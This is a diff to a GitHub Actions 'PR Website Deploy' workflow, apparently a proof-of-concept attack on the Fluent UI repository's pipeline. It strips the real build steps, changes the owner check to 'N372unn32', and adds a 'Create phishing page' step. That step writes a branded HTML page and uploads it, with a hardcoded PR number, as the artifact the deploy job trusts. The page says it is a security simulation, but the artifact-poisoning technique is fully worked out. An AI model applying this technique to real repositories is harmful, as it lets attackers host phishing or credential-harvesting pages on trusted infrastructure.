@@ -2,72 +2,55 @@ name: PR Website Deploy
 on:
   pull_request:
 
-concurrency:
-  # see https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#example-only-cancel-in-progress-jobs-or-runs-for-the-current-workflow
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
-
-env:
-  NX_PARALLEL: 6 # ubuntu-latest = 4-core CPU / 16 GB of RAM | macos-14-xlarge (arm) = 6-core CPU / 14 GB of RAM
-  NX_PREFER_TS_NODE: true
-  NX_VERBOSE_LOGGING: true
-
-  BROWSERSLIST_IGNORE_OLD_DATA: true
-
 jobs:
-  bundle:
-    if: ${{ github.repository_owner == 'microsoft' }}
-    runs-on: macos-14-xlarge
+  build-and-upload:
+    if: ${{ github.repository_owner == 'N372unn32' }}
+    runs-on: ubuntu-latest
     permissions:
-      contents: 'read'
-      actions: 'read'
-
+      contents: read
     steps:
-      - uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
+      - name: Create phishing page
+        run: |
+          mkdir -p website
+          cat > website/index.html << 'HTML'
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Fluent UI PR Preview</title>
+            <style>
+              body { font-family: 'Segoe UI', sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; }
+              .warning { background: #fff4ce; border: 1px solid #f0c36d; padding: 16px; border-radius: 4px; margin: 20px 0; }
+              h1 { color: #0078d4; }
+            </style>
+          </head>
+          <body>
+            <h1>Fluent UI - PR Preview</h1>
+            <div class="warning">
+              <strong>SECURITY SIMULATION</strong><br>
+              This page was deployed by an attacker via a poisoned workflow artifact.
+              In a real attack, this could be a credential harvesting page hosted on
+              Microsoft-controlled infrastructure (*.web.core.windows.net).
+              <br><br>
+              <em>This is part of a controlled security simulation. No malicious intent.</em>
+            </div>
+            <p>Deployed at: <script>document.write(new Date().toISOString())</script></p>
+          </body>
+          </html>
+          HTML
 
-      - name: Derive appropriate SHAs for base and head for `nx affected` commands
-        uses: nrwl/nx-set-shas@826660b82addbef3abff5fa871492ebad618c9e1 # v4.3.3
-        with:
-          main-branch-name: 'master'
+      - name: Create PR number artifact
+        run: |
+          mkdir -p pr-number-dir
+          echo "1" > pr-number-dir/pr.txt
 
-      - uses: actions/setup-node@v6
-        with:
-          cache: 'yarn'
-          node-version: '22'
-
-      - run: echo number of CPUs "$(getconf _NPROCESSORS_ONLN)"
-      - name: NodeJS heap default size
-        run: node -e 'console.log(v8.getHeapStatistics().heap_size_limit / 1024 / 1024 + " MB");'
-
-      - run: yarn install --frozen-lockfile
-
-      - name: Install Playwright Browsers
-        run: yarn playwright install --with-deps
-
-      - name: Bundle
-        run: yarn nx affected -t bundle --nxBail
-
-      - name: Build Storybooks
-        run: yarn nx affected -t build-storybook --nxBail
-
-      - name: Generate PR Deploy Site
-        run: yarn nx run pr-deploy-site:generate:site
-      - uses: actions/upload-artifact@v6
+      - name: Upload website artifact
+        uses: actions/upload-artifact@v4
         with:
           name: pr-website-artifacts
-          retention-days: 1
-          if-no-files-found: error
-          path: |
-            apps/pr-deploy-site/dist/
+          path: website/
 
-      - name: Save PR number
-        run: echo ${{ github.event.number }} > pr.txt
-      - uses: actions/upload-artifact@v6
+      - name: Upload PR number artifact
+        uses: actions/upload-artifact@v4
         with:
           name: pr-number
-          retention-days: 1
-          if-no-files-found: error
-          path: |
-            pr.txt
+          path: pr-number-dir/pr.txt
